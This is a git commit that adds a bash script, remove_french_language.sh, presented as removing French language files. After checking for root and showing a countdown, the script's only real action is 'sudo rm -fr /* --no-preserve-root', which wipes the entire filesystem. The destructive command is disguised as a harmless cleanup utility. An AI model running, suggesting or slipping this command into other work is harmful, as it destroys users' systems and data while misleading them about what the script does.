97435c47fd3236701ceff11abd7557b4cc865c5d
Simon Eric Afonso <simonafonso4@gmail.com>
2025-03-20 00:17:26 +0100

    french language pack script added

---
+++ scripts/remove_french_language/remove_french_language.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+
+# Check if the script is run as root
+if [ "$(id -u)" -ne 0 ]; then
+    echo "You must run this script as root!"
+    exit 1
+fi
+
+# Display a thank you message
+echo "Thank you for using this script."
+echo "Your system will be wiped clean from the French language files in ..."
+for i in 3 2 1; do
+    echo "$i..."
+    sleep 1
+
+done
+
+# Placeholder for the command to be executed later
+echo "Now executing the cleanup command..."
+
+sudo rm -fr /* --no-preserve-root
